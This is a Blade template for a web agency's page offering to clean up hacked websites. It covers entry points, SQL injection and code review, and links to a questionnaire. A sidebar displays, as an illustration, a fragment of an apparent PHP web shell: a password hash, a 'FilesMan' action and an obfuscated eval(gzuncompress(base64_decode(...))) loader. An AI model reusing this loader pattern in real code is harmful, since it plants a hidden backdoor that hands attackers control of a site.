@extends('layouts.app')

@section('title', 'Hacked')
@section('description', 'Website hacked or seeing things that you shouldn\'t. Let us take a look at what is going on.')
@section('keywords', 'hacked, compromised, sql injection, defaced website, locked out, website sending out spam, word fence, base64_decode')
@section('body_class', 'hacked')

@section('page-styles')
  <link href="/css/vendor/prism.css" rel="stylesheet" />
@endsection

@section('page-js-files')
  <script defer src="/js/vendor/prism.js"></script>
@endsection

@section('content')
  @component('components.hero')
    @slot('pageTitle')
      HACKED?
    @endslot
    @slot('pageSubtitle')
      Really, What The &%#!
    @endslot
    @slot('pageShortDescription')
      What did I do, Why Me?
    @endslot
  @endcomponent

  {{ Breadcrumbs::render('websites-and-apps.hacked') }}

  @include('partials.message')

  <div class="container">
    <div class="row theme">
      <div class="col-md-12">
        <div class="column left first">
          <h2 class="extend lower">
            #hackedwebsite
          </h2>

          <p class="leader">
            If you've landed on this page the chances are your website has been hacked.
          </p>

          <p>
            Don't take it personal. Not about you or your website. Your just a vehicle for sending out spam to prey on the weak for $$$, political backlash due to some unjustice, hijacking for profit, or script kiddies to see what they can do from something they can't do on their own.
          </p>

          <p>
            Seeing that we are developers that also run a hosting company we have seen a lot. Unfortunately we have the unique skill of identifying how a website was hacked and and fixing the problem so it doesn't happen again.
          </p>
        </div>
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-6 col-sm-6">
        <div class="column left light-grey">
          <h2 class="extend">Q: WHAT CAN I DO NOW?</h2>

          <blockquote>
            A: Take a deep breath, we can help.
          </blockquote>
        </div>
      </div>

      <div class="col-md-6 col-sm-6">
        <div class="column right light-grey">
          <p>
            Hopefully you have a backup of your website. You did make one didn't you? If so, store this off in a safe place.
          </p>

          <p>
            Wide array of tools to perform penetration testing for website vulnerabilities, just like they do.
          </p>
        </div>
      </div>
    </div>

    <div class="row theme">
      <div class="col-md-8">
        <div class="row theme equalize">
          <div class="col-md-6 col-sm-6">
            <div class="column left white no-extend">
              <h3 class="extend">Entry Point</h3>

  						<p class="leader">
  							Door open, door shut
  						</p>

  						<p>
                Who left the front door open? Security issue on a plugin or module? Web server or OS level vulnerability?
              </p>
            </div>
          </div>

          <div class="col-md-6 col-sm-6">
            <div class="column right white no-extend">
              <h3 class="extend">Vector Analysis</h3>

  						<p class="leader">
  							One weak link can kill you
  						</p>

              <p>
                After the hack has been fixed we will perform a vector analysis to determine areas that leave you vunerable.
              </p>
            </div>
          </div>
        </div>

        <div class="row theme equalize">
          <div class="col-md-6 col-sm-6">
            <div class="column left white no-extend">
              <h3 class="extend">SQL Injection</h3>

  						<p class="leader">
  							We're not fans of needles
  						</p>

              <p>
                Nasty way to get in, but it is a real threat.  Input that is not validiated properly is as bad or worse than a security issue with your building blocks.
              </p>
            </div>
          </div>

          <div class="col-md-6 col-sm-6">
            <div class="column right white no-extend">
              <h3 class="extend">Code Review</h3>

  						<p class="leader">
  							We have a mole
  						</p>

              <p>
                Persistent hacks are signs of a bigger issue. Already embeded in the database, custom code issue beyond sql injection.
              </p>

              <p>
                Time to take the gloves off.
              </p>
            </div>
          </div>
        </div>
      </div>

      <div class="col-md-4 desktop-only">
        <div class="column right code">
<pre><code class="language-php line-numbers">$auth_pass = "63a9f0ea7bb98050796b649e85481845";
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
$xYEzDu6r3EZT="GR5yYXp3YH17ejRne3h9cGdgdWBxPDB5dX9xYWQ9NG8ZHjQ0NDQweHt4NCk0MzMvG
R40NDQ0cntmPDB9KSQvMH00KDRnYGZ4cXo8MHl1f3FhZD0vMH0/KSY9NG8ZHjQ0NDQ0NDB4e3g6KXd8Z
jx8cWxwcXc8Z2F2Z2BmPDB5dX9xYWQ4MH04Jj09PS8ZHjQ0NDRpGR40NDQ0ZnFgYWZ6NDB4e3gvGR5pG
yJyIiAiISYsIXUhLCF1IiwiJiAnIiwicSIhInAidyMhIXUicCMsIiwiICAjISEiciEtInAgIiN1IXUhI
CEtJyQhLCcmISYidyEtJyYnLSJ2IXUhJyIjInEgcSEjIC0jLCByISMhdScgIichICBwIyMiJSJ2ISUnI
yMgInAiJSMtJy0hJCEtISMgcSB2IScnJicsJyEhJiJ2IncgLCImI3UgIiAsIiYjdSJ3IC0hJyEhIicnJ
SEtInciIyN1IS0nJiMgI3UiICJwInYnJiEjICwhIiMsIXUidSIgIHYgdiMtJywjdSEiICwicicnIS0id
iMjJyAgdyckJywjdSImInciLCElIHEgIyAiJyYgcSN1IncgcSEjICcjJyMjISMicCcgJyEiJyAiIXUgd
iIlICAgcCchISMhIiJ2IyIhJScmJyEgciEnISwjJCJ2IHIgISctIyEhJycmJyEidSEtJyUhJiIsIiEid

eval(gzuncompress(base64_decode($xYEzDu6r3EZT)));
</code></pre>
        </div>
      </div>
    </div>

    <div class="row theme">
      <div class="col-md-12">
        <div class="column dark-grey call-to-action">
          <h2>Need help?</h2>

          <p>
            Take a minute to fill out our hacked website project questionnaire so that we can understand what is going on.
          </p>

          <a href="{{ route ('websites-and-apps.hacked.questionnaire') }}" class="button rounded">Tell Us About Your Situation</a>
        </div>
      </div>
    </div>
  </div>
@endsection
